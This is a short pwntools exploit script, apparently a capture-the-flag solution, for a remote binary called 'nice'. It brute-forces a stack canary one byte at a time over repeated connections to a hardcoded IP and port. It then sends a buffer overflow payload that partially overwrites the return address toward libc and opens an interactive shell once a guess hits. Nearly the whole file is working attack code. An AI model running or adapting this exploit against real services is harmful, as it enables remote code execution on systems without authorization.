#!/usr/bin/python

from pwn import *

# context.log_level = 'warn'

PATH = './nice'

GDBSCRIPT = '''

'''

HOST = '172.17.0.2'
PORT = 4444

HOST = '103.41.207.206'
PORT = 8821


def find_canary():
    canary = b'\0'
    while len(canary) < 8:
        for i in range(255, -1, -1):
            print(len(canary), hex(i))
            r = remote(HOST, PORT)
            r.send(b'A' * 0x38 + canary + bytes([i]))
            r.recvline(0)
            try:
                r.recvline(0)
            except:
                canary += bytes([i])
                print(canary)
                break
            r.close()
    return canary
    

if __name__ == '__main__':
    elf  = ELF(PATH)

    '''
    0x7ffdb396fc90:	0x00007ffdb396fd90	0x81628625b037c000
    0x7ffdb396fca0:	0x0000000000000000	0x00007f8f9357c0b3
    '''

    # canary = find_canary()
    # print(hex(u64(canary)))
    canary = p64(0xc54d966138e6ad00)

    libc_leak = b'\x2b'

    for i in range(0, 256, 16):
        payload = b'A' * 0x38 + canary + canary + libc_leak + bytes([i])
        print(hex(i))
        r = remote(HOST, PORT)
        
        r.send(payload)
        r.recvline(0)
            
        try:
            r.recvline(0)
            r.interactive()
        except:
            pass
        r.close()
    
